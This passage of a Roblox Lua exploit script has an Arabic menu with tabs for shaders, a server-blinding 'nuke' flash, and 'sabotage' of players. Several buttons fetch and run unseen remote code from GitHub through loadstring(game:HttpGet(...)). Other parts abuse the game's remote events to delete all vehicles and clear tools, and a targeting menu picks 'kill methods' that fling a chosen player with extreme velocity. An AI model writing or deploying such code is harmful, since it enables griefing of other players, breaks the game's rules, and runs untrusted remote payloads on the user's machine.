        end
    end
end

local function clearSeason()
    for _,v in pairs(activeAssets) do
        if v then v:Destroy() end
    end
    table.clear(activeAssets)

    if activeSound then
        activeSound:Stop()
        activeSound:Destroy()
        activeSound=nil
    end

    for part,data in pairs(originalData) do
        if part and part.Parent then
            part.Color=data.Color
            part.Material=data.Material
        end
    end

    Lighting.ClockTime=14
    Lighting.FogEnd=100000

    local cc=Lighting:FindFirstChild("SeasonColorCorr")
    if cc then cc:Destroy() end
end

local function playSound(id)
    activeSound=Instance.new("Sound",SoundService)
    activeSound.SoundId=id
    activeSound.Volume=0.3
    activeSound.Looped=true
    activeSound:Play()
end

local function createSnow()
    local points={Vector3.new(0,180,0),Vector3.new(600,180,600),Vector3.new(-600,180,-600)}
    for _,pos in pairs(points) do
        local p=Instance.new("Part")
        p.Size=Vector3.new(1500,1,1500)
        p.Position=pos
        p.Anchored=true
        p.Transparency=1
        p.CanCollide=false
        p.Parent=workspace
        table.insert(activeAssets,p)

        local emitter=Instance.new("ParticleEmitter",p)
        emitter.Texture="rbxassetid://16471396163"
        emitter.Size=NumberSequence.new(0.3,0.7)
        emitter.Lifetime=NumberRange.new(12,18)
        emitter.Rate=120
        emitter.Acceleration=Vector3.new(0,-2.5,0)
        emitter.Shape=Enum.ParticleEmitterShape.Box
    end
end

local function createLeaves()
    local p=Instance.new("Part")
    p.Size=Vector3.new(2000,1,2000)
    p.Position=Vector3.new(0,150,0)
    p.Anchored=true
    p.Transparency=1
    p.CanCollide=false
    p.Parent=workspace
    table.insert(activeAssets,p)

    local emitter=Instance.new("ParticleEmitter",p)
    emitter.Texture="rbxassetid://81322936295859"
    emitter.Size=NumberSequence.new(0.6,1.2)
    emitter.Lifetime=NumberRange.new(10,15)
    emitter.Rate=50
    emitter.Acceleration=Vector3.new(5,-5,2)
end

shaderPresets={
["طور الحيوي"]={
BloomEffect={Intensity=2,Size=24,Threshold=0.8},
ColorCorrectionEffect={Brightness=0.1,Contrast=1.2,Saturation=1},
SunRaysEffect={Intensity=0.15,Spread=1}
},

["الكئيب"]={
BloomEffect={Intensity=1.2,Size=20,Threshold=0.9},
ColorCorrectionEffect={Brightness=-0.1,Contrast=1.3,Saturation=0.6,TintColor=Color3.fromRGB(255,240,220)},
DepthOfFieldEffect={FocusDistance=25,InFocusRadius=15,NearIntensity=0.7,FarIntensity=0.7}
},

["طور الواقعي"]={
BloomEffect={Intensity=0.8,Size=16,Threshold=0.95},
ColorCorrectionEffect={Brightness=0.05,Contrast=1.1,Saturation=0.7},
SunRaysEffect={Intensity=0.08,Spread=0.8}
},

["طور المظلم"]={
BloomEffect={Intensity=3,Size=24,Threshold=0.7},
ColorCorrectionEffect={Brightness=-0.2,Contrast=1.4,Saturation=0.5,TintColor=Color3.fromRGB(180,200,255)},
BlurEffect={Size=2}
},

["طور الحلم"]={
BloomEffect={Intensity=2.5,Size=24,Threshold=0.6},
ColorCorrectionEffect={Brightness=0.2,Contrast=1.1,Saturation=1.2,TintColor=Color3.fromRGB(255,220,255)},
BlurEffect={Size=4},
SunRaysEffect={Intensity=0.2,Spread=1.2}
}
}

local Tab9=Window:MakeTab({
Title="الشادر",
Icon="rbxassetid://10723415903"
})

Tab9:AddSection({"تأثير وقوة الاضواء"})

Tab9:AddToggle({
Name="تفعيل قوة الاضائة",
Default=false,
Callback=function(s)
if s then
createEffect("BloomEffect",{Intensity=1.5,Size=24,Threshold=0.9})
else
removeEffect("BloomEffect")
end
end
})

Tab9:AddSlider({
Name="قوة وحجم الاضواء",
Min=0.1,
Max=5,
Default=1.5,
Callback=function(v)
local e=getEffect("BloomEffect")
if e then e.Intensity=v end
end
})

Tab9:AddSection({"التشبعات والالوان"})

Tab9:AddToggle({
Name="تفعيل تشبع الشادرز",
Default=false,
Callback=function(s)
if s then
createEffect("ColorCorrectionEffect",{Brightness=0.05,Contrast=1.1,Saturation=0.8,TintColor=Color3.fromRGB(255,255,255)})
else
removeEffect("ColorCorrectionEffect")
end
end
})

Tab9:AddSlider({
Name="تشبع الضوء",
Min=0,
Max=2,
Default=0.8,
Callback=function(v)
local e=getEffect("ColorCorrectionEffect")
if e then e.Saturation=v end
end
})

Tab9:AddSlider({
Name="تشبع الالوان",
Min=0.5,
Max=2,
Default=1.1,
Callback=function(v)
local e=getEffect("ColorCorrectionEffect")
if e then e.Contrast=v end
end
})

Tab9:AddSlider({
Name="تحكم بالاضاءة الماب",
Min=-0.5,
Max=0.5,
Default=0.05,
Callback=function(v)
local e=getEffect("ColorCorrectionEffect")
if e then e.Brightness=v end
end
})

Tab9:AddSection({"التغويش"})

Tab9:AddToggle({
Name="تفعيل دقة وتغويش",
Default=false,
Callback=function(s)
if s then
createEffect("BlurEffect",{Size=3})
else
removeEffect("BlurEffect")
end
end
})

Tab9:AddSlider({
Name="دقة الشادر",
Min=1,
Max=10,
Default=3,
Callback=function(v)
local e=getEffect("BlurEffect")
if e then e.Size=v end
end
})

Tab9:AddSection({"مودات الشادرز"})

for name,_ in pairs(shaderPresets) do
Tab9:AddButton({
Name="Preset: "..name,
Callback=function()
applyPreset(name)
end
})
end Tab9:AddSection({"الشادرات"})

Tab9:AddToggle({
Name = "RTX/شادر",
Default = false,
Callback = function(state)

if state then

saveLighting()

loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/main/Tahakom75"))()

else

restoreLighting()

end
end
})

Tab9:AddToggle({
Name = "جودة إضاءة سينمائية",
Default = false,
Callback = function(state)

if state then

for _,v in pairs(Lighting:GetChildren()) do
if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") 
or v:IsA("SunRaysEffect") or v:IsA("Sky") or v:IsA("Atmosphere") then
v:Destroy()
end
end

local Bloom = Instance.new("BloomEffect",Lighting)
local Blur = Instance.new("BlurEffect",Lighting)
local ColorCor = Instance.new("ColorCorrectionEffect",Lighting)
local SunRays = Instance.new("SunRaysEffect",Lighting)
local Sky = Instance.new("Sky",Lighting)
local Atm = Instance.new("Atmosphere",Lighting)

Bloom.Intensity = 0.3
Bloom.Size = 10
Bloom.Threshold = 0.8

Blur.Size = 5

ColorCor.Brightness = 0.1
ColorCor.Contrast = 0.5
ColorCor.Saturation = -0.3
ColorCor.TintColor = Color3.fromRGB(255,235,203)

SunRays.Intensity = 0.075
SunRays.Spread = 0.727

Sky.SkyboxBk = "http://www.roblox.com/asset/?id=151165214"
Sky.SkyboxDn = "http://www.roblox.com/asset/?id=151165197"
Sky.SkyboxFt = "http://www.roblox.com/asset/?id=151165224"
Sky.SkyboxLf = "http://www.roblox.com/asset/?id=151165191"
Sky.SkyboxRt = "http://www.roblox.com/asset/?id=151165206"
Sky.SkyboxUp = "http://www.roblox.com/asset/?id=151165227"
Sky.SunAngularSize = 10

Lighting.Ambient = Color3.fromRGB(2,2,2)
Lighting.Brightness = 2.25
Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
Lighting.EnvironmentDiffuseScale = 0.2
Lighting.EnvironmentSpecularScale = 0.2
Lighting.GlobalShadows = true
Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
Lighting.ShadowSoftness = 0.2
Lighting.ClockTime = 17
Lighting.GeographicLatitude = 45
Lighting.ExposureCompensation = 0.5

Atm.Density = 0.364
Atm.Offset = 0.556
Atm.Color = Color3.fromRGB(199,175,166)
Atm.Decay = Color3.fromRGB(44,39,33)
Atm.Glare = 0.36
Atm.Haze = 1.72

else
restoreLighting()

end
end
})

Tab9:AddButton({
Name = "شادر بسيط (للاجهزة الضعيفة)",
Callback = function()

removeAllShaders()

createEffect("ColorCorrectionEffect",{
Brightness = 0.05,
Contrast = 1.1,
Saturation = 0.8
})

end
})

Tab9:AddButton({
Name = "حذف كل الشادر",
Callback = function()
removeAllShaders()
end
})

Tab9:AddSection({"الأجواء"})

Tab9:AddDropdown({
Name = "اختر الفصل 🌍",
Default = "شتاء",
Options = {"شتاء","خريف"},
Callback = function(v)
currentSeason = v
end
})

Tab9:AddButton({
Name = "تفعيل الأجواء",
Callback = function()

storeOriginals()
clearSeason()

if currentSeason == "شتاء" then

playSound("rbxassetid://9114057104")

for part,_ in pairs(originalData) do
part.Material = Enum.Material.Snow
part.Color = Color3.fromRGB(255,255,255)
end

createSnow()

Lighting.FogColor = Color3.fromRGB(215,220,235)
Lighting.FogEnd = 1200

elseif currentSeason == "خريف" then

playSound("rbxassetid://152434053")

for part,data in pairs(originalData) do
local r,g,b = data.Color.R*255,data.Color.G*255,data.Color.B*255
if g>r and g>b then
part.Color = Color3.fromRGB(180,80,20)
part.Material = Enum.Material.Grass
end
end

createLeaves()

Lighting.ClockTime = 17.2
Lighting.FogColor = Color3.fromRGB(180,120,50)
Lighting.FogEnd = 1500

local cc = Instance.new("ColorCorrectionEffect",Lighting)
cc.Name = "SeasonColorCorr"
cc.Saturation = 0.2
table.insert(activeAssets,cc)

end

end
})

Tab9:AddButton({
Name = "إيقاف الأجواء ❌",
Callback = function()
clearSeason()
end
})
Tab9:AddSection({ "" })

SkyBoxTab = Window:MakeTab({ Title = "[SkyBox]فلاش ماب", Icon = "rbxassetid://13364900349" })

local colors = { "Bright red", "Lime green", "Bright blue", "Bright yellow", "Bright cyan", "Hot pink", "Royal purple" }
local rgbEnabled = false

 function changeColor(color)
    local args = { color }
    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeBodyColor"):FireServer(unpack(args))
end

 function toggleRGBCharacter(enabled)
    rgbEnabled = enabled
    if rgbEnabled then
        while rgbEnabled do
            for _, color in ipairs(colors) do
                if not rgbEnabled then return end
                changeColor(color)
                wait(0.5)
            end
        end
    end
end

SkyBoxTab:AddToggle({
    Name = "تلوين السكن والفلاش",
    Description = "RGB",
    Default = false,
    Callback = function(value)
        toggleRGBCharacter(value)
    end
})

_G.HideNukePlayers = false
_G.HiddenPlayers = {}

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local NUKE_ANIM = "rbxassetid://70883871260184"

local NUKE_BODY = {
	["96655874457685"] = true,
	["123402086843885"] = true,
	["78300682916056"] = true,
	["86276701020724"] = true,
	["78409653958165"] = true,
	["120668655481073"] = true
}


local function Notify(txt)
	pcall(function()
		StarterGui:SetCore("SendNotification",{
			Title = "مضاد الفلاش والسماء",
			Text = txt,
			Duration = 4
		})
	end)
end

local function CheckAndHidePlayer(plr)
	if not _G.HideNukePlayers then return end
	if _G.HiddenPlayers[plr] then return end

	local char = plr.Character
	if not char then return end

	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	local found = false
	local tracks = hum:GetPlayingAnimationTracks()

	for _,tr in pairs(tracks) do
		if tr.Animation and tr.Animation.AnimationId == NUKE_ANIM then
			found = true
		end
	end

	local desc = hum:GetAppliedDescription()

	if desc then
		local ids = {
			desc.Torso,
			desc.RightArm,
			desc.LeftArm,
			desc.RightLeg,
			desc.LeftLeg,
			desc.Head
		}

		for _,id in pairs(ids) do
			if NUKE_BODY[tostring(id)] then
				found = true
			end
		end
	end

	if not found then return end

	local saved = {
		parts = {},
		tracks = {}
	}

	for _,obj in pairs(char:GetDescendants()) do
		if obj:IsA("BasePart") then
			table.insert(saved.parts,obj)
			obj.LocalTransparencyModifier = 1
		end
	end

	for _,tr in pairs(tracks) do
		if tr.Animation and tr.Animation.AnimationId == NUKE_ANIM then
			table.insert(saved.tracks,tr)
			tr:Stop()
		end
	end


	_G.HiddenPlayers[plr] = saved

	Notify("تم اخفاء سكاي اللاعب الكلب: "..plr.Name)
end

SkyBoxTab:AddToggle({
	Name = "مضاد فلاش العمى او اختراق السماء",
	Default = false,
	Callback = function(v)

		_G.HideNukePlayers = v

		if v then

			for _,plr in ipairs(Players:GetPlayers()) do
				if plr ~= Players.LocalPlayer then

					task.spawn(function()
						repeat task.wait() until plr.Character
						task.wait(1)

						CheckAndHidePlayer(plr)
					end)

				end
			end

		else

			for _,data in pairs(_G.HiddenPlayers) do

				pcall(function()

					for _,p in pairs(data.parts) do
						p.LocalTransparencyModifier = 0
					end


					for _,t in pairs(data.tracks) do
						t:Play()
					end

				end)
			end


			_G.HiddenPlayers = {}

		end
	end
})

Players.PlayerAdded:Connect(function(plr)

	plr.CharacterAdded:Connect(function()

		task.wait(2)
		CheckAndHidePlayer(plr)

	end)
end)


for _,plr in ipairs(Players:GetPlayers()) do

	if plr ~= Players.LocalPlayer then

		plr.CharacterAdded:Connect(function()

			task.wait(2)
			CheckAndHidePlayer(plr)

		end)

	end

end


local TshirtIDs = {
    ["الافتراضي"] = nil,
    ["colkid"] = 98679358331654,
    ["T-Shirt 3"] = 100000000000003,
    ["T-Shirt 4"] = 100000000000004,
    ["T-Shirt 5"] = 100000000000005,
    ["T-Shirt 6"] = 100000000000006,
    ["T-Shirt 7"] = 100000000000007,
    ["T-Shirt 8"] = 100000000000008,
    ["T-Shirt 9"] = 100000000000009,
    ["T-Shirt 10"] = 100000000000010
}

local SelectedTshirtID = nil

local function notify(title, text)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = 4
    })
end

SkyBoxTab:AddDropdown({
    Name = "اختر التيشرت",
    Description = "Skybox FE",
    Options = {
        "الافتراضي","colkid","T-Shirt 3","T-Shirt 4","T-Shirt 5",
        "T-Shirt 6","T-Shirt 7","T-Shirt 8","T-Shirt 9","T-Shirt 10"
    },
    Default = "الافتراضي",
    Callback = function(option)
        SelectedTshirtID = TshirtIDs[option]
        notify("T-Shirt", "تم اختيار: "..option)
    end
})

 SkyboxActive = false
 CurrentTrack = nil
 RigidTrack = nil

SkyBoxTab:AddButton({
   Name = "اختراق السماء يظهر🥶",
   Callback = function()

        if SkyboxActive then
            if CurrentTrack then
                CurrentTrack:Stop(0.1)
                CurrentTrack = nil
            end
            if RigidTrack then
                RigidTrack:Stop(0.1)
                RigidTrack = nil
            end

            ReplicatedStorage.Remotes.ResetCharacterAppearance:FireServer()
            task.wait(0.3)

             char = LocalPlayer.Character
            if char then
                 hum = char:FindFirstChildOfClass("Humanoid")
                if hum then hum.Health = 100 end
            end

            SkyboxActive = false
            print("")
            return
        end

         WearShirt = ReplicatedStorage.Remotes:FindFirstChild("WearShirt")
        if SelectedTshirtID and WearShirt then
            pcall(function()
                WearShirt:InvokeServer(SelectedTshirtID)
            end)
        end
        ReplicatedStorage.Remotes.ChangeCharacterBody:InvokeServer({100839513065432})

         player = LocalPlayer
         character = player.Character or player.CharacterAdded:Wait()
         humanoid = character:WaitForChild("Humanoid")

        local Settings = {
            ["Fade In"] = 0.1,
            ["Fade Out"] = 0.1,
            ["Weight"] = 1,
            ["Speed"] = 1,
            ["Time Position"] = 0
        }

         function LoadTrack(id)
             anim = Instance.new("Animation")
            anim.AnimationId = "rbxassetid://"..id
             track = humanoid:LoadAnimation(anim)
            track.Priority = Enum.AnimationPriority.Action4
            track:Play(Settings["Fade In"], Settings["Weight"], Settings["Speed"])
            CurrentTrack = track
            return track
        end

        LoadTrack(70883871260184)
        task.wait(0.5)

         plank = Instance.new("Animation")
        plank.AnimationId = "rbxassetid://3695333486"
        RigidTrack = humanoid:LoadAnimation(plank)
        RigidTrack.Priority = Enum.AnimationPriority.Movement
        RigidTrack:Play(0.1,1,0)

        SkyboxActive = true
        print("Skybox")
   end
})

SkyBoxTab:AddButton({
    Name = "🌃الغاء اختراق السماء",
    Callback = function()
        if CurrentTrack then
            CurrentTrack:Stop(0.1)
            CurrentTrack = nil
        end
        if RigidTrack then
            RigidTrack:Stop(0.1)
            RigidTrack = nil
        end

        SkyboxActive = false
        ReplicatedStorage.Remotes.ResetCharacterAppearance:FireServer()
        task.wait(0.3)

         char = LocalPlayer.Character
        if char then
             hum = char:FindFirstChildOfClass("Humanoid")
            if hum then hum.Health = 100 end
        end

        print("")
    end
})

local SpinSpeed = 1
local SpinEnabled = false
local SpinConnection = nil

SkyBoxTab:AddSlider({
    Name = "اختار سرعة دوران",
    Min = 1,
    Max = 100,
    Default = 1,
    Increment = 1,
    ValueName = "Speed",
    Callback = function(Value)
        SpinSpeed = Value
    end
})

SkyBoxTab:AddToggle({
    Name = "تشغيل الدوران",
    Default = false,
    Callback = function(Value)
        SpinEnabled = Value

        if SpinEnabled then
            if SpinConnection then SpinConnection:Disconnect() end

            SpinConnection = RunService.Heartbeat:Connect(function(dt)
                local char = LocalPlayer.Character
                if not char then return end

                local root = char:FindFirstChild("HumanoidRootPart")
                if not root then return end

                local radiansPerSecond = SpinSpeed * math.pi
                local rotation = radiansPerSecond * dt

                root.CFrame = root.CFrame * CFrame.Angles(0, rotation, 0)
            end)
        else
            if SpinConnection then
                SpinConnection:Disconnect()
                SpinConnection = nil
            end
        end
    end
})

SkyBoxTab:AddSection({ "فلاش يعمي السيرفر🚨" })
SkyBoxTab:AddToggle({
	Name = "V2فلاش يغطي الماب",
	Default = false,
	Callback = function(v)

		 Players = game:GetService("Players")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")

		LocalPlayer = Players.LocalPlayer
		 ChangeCharacterBody = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody")

	 ANIM_ID = "rbxassetid://70883871260184"

	 NUKE_BODY = {
			96655874457685,
			123402086843885,
			78300682916056,
			86276701020724,
			78409653958165,
			120668655481073
		}

		if not _G.NukeSkyboxV2 then
			_G.NukeSkyboxV2 = {}
		end
	data = _G.NukeSkyboxV2

		 function getHumanoid()
			local char = LocalPlayer.Character
			if not char then return end
			return char:FindFirstChildOfClass("Humanoid")
		end

		if v then
			 humanoid = getHumanoid()
			if not humanoid then return end

			 d = humanoid:GetAppliedDescription()
			data.savedBody = {
				d.Torso,
				d.RightArm,
				d.LeftArm,
				d.RightLeg,
				d.LeftLeg,
				d.Head
			}

			pcall(function()
				ChangeCharacterBody:InvokeServer(NUKE_BODY)
			end)

			task.wait(0.3)

			 anim = Instance.new("Animation")
			anim.AnimationId = ANIM_ID
			data.track = humanoid:LoadAnimation(anim)
			data.track.Priority = Enum.AnimationPriority.Action4
			data.track:Play(0.1, 1, 1)
			data.track:AdjustSpeed(0.0001)

		else
			if data.track then
				pcall(function()
					data.track:Stop()
					data.track:Destroy()
				end)
				data.track = nil
			end

			if data.savedBody then
				task.wait(0.2)
				pcall(function()
					ChangeCharacterBody:InvokeServer(data.savedBody)
				end)
			end
		end
	end
})
SkyBoxTab:AddToggle({
Name = "فلاش يرمش الماب[V3]",
Default = false,
Callback = function(v)

Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

LocalPlayer = Players.LocalPlayer
ChangeCharacterBody = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody")

ANIM_ID = "rbxassetid://70883871260184"

NUKE_BODY = {
	96655874457685,
	123402086843885,
	78300682916056,
	86276701020724,
	78409653958165,
	120668655481073
}

if not _G.NukeSkyboxV2 then
	_G.NukeSkyboxV2 = {}
end
data = _G.NukeSkyboxV2

function getHumanoid()
	local char = LocalPlayer.Character
	if not char then return end
	return char:FindFirstChildOfClass("Humanoid")
end

if v then
	humanoid = getHumanoid()
	if not humanoid then return end

	d = humanoid:GetAppliedDescription()
	data.savedBody = {
		d.Torso,
		d.RightArm,
		d.LeftArm,
		d.RightLeg,
		d.LeftLeg,
		d.Head
	}

	pcall(function()
		ChangeCharacterBody:InvokeServer(NUKE_BODY)
	end)

	task.wait(0.3)

	anim = Instance.new("Animation")
	anim.AnimationId = ANIM_ID
	data.track = humanoid:LoadAnimation(anim)
	data.track.Priority = Enum.AnimationPriority.Action4
	data.track:Play(0.1,1,1)

	data.track:AdjustSpeed(_G.NukeAnimSpeed or 0.01)

else
	if data.track then
		pcall(function()
			data.track:Stop()
			data.track:Destroy()
		end)
		data.track = nil
	end

	if data.savedBody then
		task.wait(0.2)
		pcall(function()
			ChangeCharacterBody:InvokeServer(data.savedBody)
		end)
	end
end
end
})

_G.NukeAnimSpeed = 0.01

SkyBoxTab:AddSlider({
	Name = "سرعة الفلاش",
	Min = 1,
	Max = 2000,
	Default = 1,
	Increment = 1,
	ValueName = "Speed",
	Callback = function(Value)

		local realSpeed = Value / 1000
		_G.NukeAnimSpeed = realSpeed

		if _G.NukeSkyboxV2 and _G.NukeSkyboxV2.track then
			pcall(function()
				_G.NukeSkyboxV2.track:AdjustSpeed(realSpeed)
			end)
		end

	end
})
SkyBoxTab:AddSection({ " " })

TrollTab = Window:MakeTab({ Title = "سكربتات تخريب", Icon = "rbxassetid://13364900349" })


TrollTab:AddSection({ "سكربتات الابواب" })
TrollTab:AddButton({
    Name = "[V3]هالة ابواب 🌪️",
    Description = "تدوير الاجزاء المتحركة",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/main/Tahakom73"))()
    end
})

TrollTab:AddButton({
    Name = " سكربت تخريب ابواب",
    Description = "اكتب هنا اسم لاعب وشغل اذا نا صار شي فعل طيران وجمع ابواب ",
Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperTradei/Super/refs/heads/main/BringPart"))()

    end
})

TrollTab:AddSection({ "🌋الكوارث" })
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")

TrollTab:AddSection({ "اعصار السفينة🔥" })

TrollTab:AddToggle({
    Name = "[⚠️ MUITO OP] سفينة ترگع ام السيرفر",
    Default = false,
    Callback = function(value)
if value then
loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/refs/heads/main/Tahakom87"))()
else
local args = {
	"DeleteAllVehicles"
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))
end
end
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Debris = game:GetService("Debris")

local UserInputService = game:GetService("UserInputService")
local ContextActionService = game:GetService("ContextActionService")

local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")

local Lighting = game:GetService("Lighting")

local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local Camera = Workspace.CurrentCamera

local flingsTab = Window:MakeTab({"التخريب على اللاعبين ", "rbxassetid://10734985040"})
flingsTab:AddSection({ "تخريب جديد حديث اقوى شي ممكن" })

local function SendNotification(title, text)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = 5,
            Icon = "rbxassetid://6023426915",
        })
    end)
    if OrionLib then
        pcall(function()
            OrionLib:MakeNotification({
                Name = title,
                Content = text,
                Time = 5
            })
        end)
    end
    warn("" .. title .. ": " .. text)
end


local function IsPlayerSitting(player)
    return false
end

local function DeleteAllVehicles()
    pcall(function()
        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer("DeleteAllVehicles")
    end)
end

local function ClearAllTools()
    pcall(function()
        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
    end)
end

local function GetAndEquipCouch()
    for _, v in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if v:IsA("Tool") and v.Name == "Couch" then
            v.Grip = CFrame.new(0, 2, -2.5)
            v.Parent = LocalPlayer.Character
            return true
        end
    end
    
    pcall(function()
        ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
    end)
    
    local startTime = tick()
    while tick() - startTime < 0.5 do
        for _, v in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if v:IsA("Tool") and v.Name == "Couch" then
                v.Grip = CFrame.new(0, 2, -2.5)
                v.Parent = LocalPlayer.Character
                return true
            end
        end
        task.wait(0.1)
    end
    return false
end

local function UnequipCouch()
    if LocalPlayer.Character then
        for _, v in ipairs(LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") and v.Name == "Couch" then
                v.Parent = LocalPlayer.Backpack
                return true
            end
        end
    end
    return false
end

local lockedTarget = nil
local lastRefreshTime = tick()

local killDropdown = flingsTab:AddDropdown({
    Name = "الاستهداف",
    Options = {},
    Default = "",
    Callback = function(value)
        if value and value ~= "" then
            lockedTarget = value
            selectedPlayerName = value
            getgenv().Target = value
            SendNotification("Alvo Travado", value .. " está selecionado!")
        end
    end
})

local function getPlayersList()
    local list = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            list[#list+1] = player.Name
        end
    end
    return list
end

local function isPlayerInList(playerName)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == playerName and player ~= LocalPlayer then
            return true
        end
    end
    return false
end

local function isTargetValid()
    if not lockedTarget then return false end
    local varsSync = (selectedPlayerName == lockedTarget and getgenv().Target == lockedTarget)
    local playerExists = isPlayerInList(lockedTarget)
    return varsSync and playerExists
end

local function refreshDropdown()
    if not killDropdown then return end
    
    local previousTarget = lockedTarget
    local newPlayers = getPlayersList()
    
    pcall(function() killDropdown:Refresh(newPlayers) end)
    pcall(function() killDropdown:Set(newPlayers) end)
    
    if previousTarget and isPlayerInList(previousTarget) then
        lockedTarget = previousTarget
        selectedPlayerName = previousTarget
        getgenv().Target = previousTarget
    else
        lockedTarget = nil
        selectedPlayerName = nil
        getgenv().Target = nil
    end
    
    lastRefreshTime = tick()
end

flingsTab:AddButton({
    Name = "تحديث قائمة اللاعبين",
    Callback = function()
        refreshDropdown()
    end
})

task.spawn(function()
    task.wait(1)
    local initialPlayers = getPlayersList()
    pcall(function() killDropdown:Refresh(initialPlayers) end)
    pcall(function() killDropdown:Set(initialPlayers) end)
end)

task.spawn(function()
    while task.wait(5) do
        if tick() - lastRefreshTime >= 500 then
            refreshDropdown()
            if lockedTarget then
                SendNotification("Atualizou", "Lista atualizada! Alvo: " .. lockedTarget)
            end
        end
        
        if lockedTarget then
            if not isTargetValid() then
                if not isPlayerInList(lockedTarget) then
                    lockedTarget = nil
                    selectedPlayerName = nil
                    getgenv().Target = nil
                    refreshDropdown()
                    SendNotification("Alvo Perdido", "Jogador saiu do servidor!")
                else
                    selectedPlayerName = lockedTarget
                    getgenv().Target = lockedTarget
                end
            end
        end
    end
end)

local selectedMethod = "كرة قدم"
flingsTab:AddDropdown({
    Name = "طريقة القتل",
    Options = {"كرة قدم", "كنبة", "قارب", "قارب شرطة", "باص", "جرارة"},
    Default = "كرة قدم",
    Callback = function(value)
        selectedMethod = value
    end
})


local function FlingBall(target)
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local backpack = LocalPlayer:WaitForChild("Backpack")
    local ServerBalls = workspace.WorkspaceCom:WaitForChild("001_SoccerBalls")

    local function GetBall()
        if not backpack:FindFirstChild("SoccerBall") then
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
        end
        repeat task.wait() until backpack:FindFirstChild("SoccerBall")
        backpack.SoccerBall.Parent = character
        repeat task.wait() until ServerBalls:FindFirstChild("Soccer" .. LocalPlayer.Name)
        character.SoccerBall.Parent = backpack
        return ServerBalls:FindFirstChild("Soccer" .. LocalPlayer.Name)
    end

    local Ball = ServerBalls:FindFirstChild("Soccer" .. LocalPlayer.Name) or GetBall()
    Ball.CanCollide = false
    Ball.Massless = true
    Ball.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)

    local tchar = target.Character
    if tchar and tchar:FindFirstChild("HumanoidRootPart") and tchar:FindFirstChild("Humanoid") then
        local troot = tchar.HumanoidRootPart
        local thum = tchar.Humanoid

        if Ball:FindFirstChildWhichIsA("BodyVelocity") then
            Ball:FindFirstChildWhichIsA("BodyVelocity"):Destroy()
        end

        local bv = Instance.new("BodyVelocity")
        bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.P = 9e900
        bv.Parent = Ball

        workspace.CurrentCamera.CameraSubject = thum
        
        repeat
            if troot.Velocity.Magnitude > 0 then
                local pos_x = troot.Position.X + (troot.Velocity.X / 1.5)
                local pos_y = troot.Position.Y + (troot.Velocity.Y / 1.5)
                local pos_z = troot.Position.Z + (troot.Velocity.Z / 1.5)
                Ball.CFrame = CFrame.new(pos_x, pos_y, pos_z)
                Ball.Orientation += Vector3.new(45, 60, 30)
            else
                for _, v in pairs(tchar:GetChildren()) do
                    if v:IsA("BasePart") and v.CanCollide and not v.Anchored then
                        Ball.CFrame = v.CFrame
                        task.wait(1/6000)
                    end
                end
            end
            task.wait(1/6000)
        until troot.Velocity.Magnitude > 1000 or thum.Health <= 0 or not tchar:IsDescendantOf(workspace)
        
        workspace.CurrentCamera.CameraSubject = humanoid
    end
end

-- ========================================
-- KILL COUCH (SEM VERIFICAÇÃO DE SEAT)
-- ========================================
local function SkidFling(TargetPlayer, originalPosition)
    local Character = LocalPlayer.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart
    local TCharacter = TargetPlayer.Character
    local THumanoid = TCharacter and TCharacter:FindFirstChildOfClass("Humanoid")
    local TRootPart = THumanoid and THumanoid.RootPart
    local THead = TCharacter and TCharacter:FindFirstChild("Head")
    
    if not (Character and Humanoid and RootPart and TCharacter and THumanoid and TRootPart) then return end
    
    if RootPart.Velocity.Magnitude < 50 then
        getgenv().OldPos = RootPart.CFrame
    end
    
    if THead then
        workspace.CurrentCamera.CameraSubject = THead
    elseif THumanoid then
        workspace.CurrentCamera.CameraSubject = THumanoid
    end
    
